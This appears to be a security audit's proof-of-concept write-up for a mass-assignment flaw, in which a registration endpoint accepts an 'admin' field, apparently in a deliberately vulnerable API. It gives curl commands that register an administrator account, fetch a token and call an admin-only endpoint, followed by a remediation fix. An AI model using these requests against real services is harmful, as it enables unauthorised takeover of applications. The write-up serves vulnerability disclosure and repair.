# C4 PoC — Mass Assignment: Admin Privilege Escalation

- **ID**: C4
- **Severity**: Critical
- **File**: api_views/users.py:60-66
- **PoC-Status**: theoretical

## Vulnerability

When `vuln=1` (the default), the `/users/v1/register` endpoint passes the raw request body directly into `User(...)` without stripping caller-supplied fields. The `admin` boolean is accepted verbatim, granting any anonymous caller full administrator privileges on registration.

Relevant code path:

```python
# api_views/users.py:60-66
if vuln and 'admin' in request_data:          # attacker controls this
    if request_data['admin']:
        admin = True
    ...
    user = User(username=..., password=..., email=..., admin=admin)  # admin=True written to DB
```

## Attacker Prerequisites

- None. No prior authentication required.
- Application must be running with `vuln=1` (default).

## Exploit

Register a new user with `"admin": true` in the JSON body:

```bash
curl -s -X POST http://localhost:5000/users/v1/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwned","password":"Passw0rd!","email":"pwned@evil.com","admin":true}' \
  | python3 -m json.tool
```

Expected response:

```json
{
    "message": "Successfully registered.",
    "status": "success"
}
```

Confirm admin status by logging in and calling a privileged endpoint:

```bash
# 1. Obtain token
TOKEN=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwned","password":"Passw0rd!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

# 2. Call admin-only endpoint (list all users)
curl -s -X GET http://localhost:5000/users/v1/admins/users/v1 \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool
```

A 200 response containing the full user list confirms the registered account has admin privileges.

## Impact

An unauthenticated attacker can instantly obtain a persistent admin account, gaining access to every privileged API operation (user enumeration, deletion, secret access). This is a full application takeover requiring zero interaction from a legitimate user.

## Remediation

Remove `admin` (and any other privilege-controlling field) from the set of fields accepted at registration. Privilege elevation must only be performed by an existing admin through a dedicated, authenticated endpoint.

```python
# safe version — never read 'admin' from request_data at registration
user = User(
    username=request_data['username'],
    password=request_data['password'],
    email=request_data['email'],
    # admin defaults to False inside the model
)
```
